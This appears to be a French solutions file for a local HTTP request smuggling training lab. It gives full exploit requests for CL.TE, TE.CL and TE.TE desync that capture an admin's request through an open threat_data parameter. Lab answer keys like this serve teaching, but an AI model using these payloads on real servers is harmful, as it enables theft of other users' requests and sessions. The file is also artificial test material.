# Solutions du Lab Request Smuggling - Édition CyberSentinel (Mode Architecture Unique)

Ce document contient les solutions pour les 3 challenges. 
**IMPORTANT :** Ce lab fonctionne maintenant en mode "Challenge Unique". Vous devez configurer le challenge actif dans `docker-compose.yml`.

## Comment changer de Challenge
1. Ouvrez `docker-compose.yml`.
2. Modifiez la variable d'environnement `CHALLENGE_MODE` dans le service `frontend` :
   - `CHALLENGE_MODE=CL.TE` (pour le challenge 1)
   - `CHALLENGE_MODE=TE.CL` (pour le challenge 2)
   - `CHALLENGE_MODE=TE.TE` (pour le challenge 3)
3. Appliquez le changement : `docker compose up --build`.

## Prérequis Généraux
- Port cible : **localhost:3000** (pour tous les challenges).
- Port Backend (interne/Host header) : **localhost:8888**.
- Le paramètre `threat_data` doit être laissé ouvert en fin de body.

---

## Challenge 1 : CL.TE (Mode : CL.TE)

**Configuration :** Assurez-vous que `CHALLENGE_MODE=CL.TE`.
**Exploit (Burp Suite) :**

```http
POST / HTTP/1.1
Host: localhost:3000
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Content-Length: 138

0

POST /ids/report HTTP/1.1
Host: localhost:8888
Content-Type: application/x-www-form-urlencoded
Content-Length: 400

threat_data=
```

---

## Challenge 2 : TE.CL (Mode : TE.CL)

**Configuration :** Assurez-vous que `CHALLENGE_MODE=TE.CL`.
**Exploit (Burp Suite) :**

```http
POST / HTTP/1.1
Host: localhost:3000
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

85
POST /ids/report HTTP/1.1
Host: localhost:8888
Content-Type: application/x-www-form-urlencoded
Content-Length: 400

threat_data=
0


```

---

## Challenge 3 : TE.TE (Mode : TE.TE)

**Configuration :** Assurez-vous que `CHALLENGE_MODE=TE.TE`.
**Exploit (Burp Suite) :**

```http
POST / HTTP/1.1
Host: localhost:3000
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding : chunked
Content-Length: 138

0

POST /ids/report HTTP/1.1
Host: localhost:8888
Content-Type: application/x-www-form-urlencoded
Content-Length: 400

threat_data=
```

## Vérification
1. Envoyez la requête d'exploit.
2. Accédez au dashboard : `http://localhost:3000/ids/dashboard`.
3. Vous devriez voir la requête de l'admin capturée.
